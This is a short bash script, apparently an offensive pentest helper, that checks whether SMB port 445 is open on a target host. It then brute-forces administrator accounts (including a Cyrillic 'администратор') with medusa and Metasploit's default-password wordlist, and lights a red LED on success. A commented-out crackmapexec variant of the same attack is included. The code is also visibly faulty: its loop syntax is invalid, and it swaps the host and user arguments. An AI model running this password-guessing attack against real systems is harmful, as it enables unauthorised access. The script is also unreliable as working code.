#!/bin/bash

WAIT=1
DPORT=445

if nc -nw $WAIT $1 $DPORT < /dev/null 2> /dev/null; then
	echo 'bruteforcing smb'
	for user in (администратор administrator admin); do
		#if cme smb -d . -u $user -p /usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt --shares $1 2>&1 | grep Pwn3d; then
		if medusa -M smbnt -m PASS:PASSWORD -h $user -u admin -P /usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt | grep SUCCESS; then
			led red on 2> /dev/null
		fi
	done
fi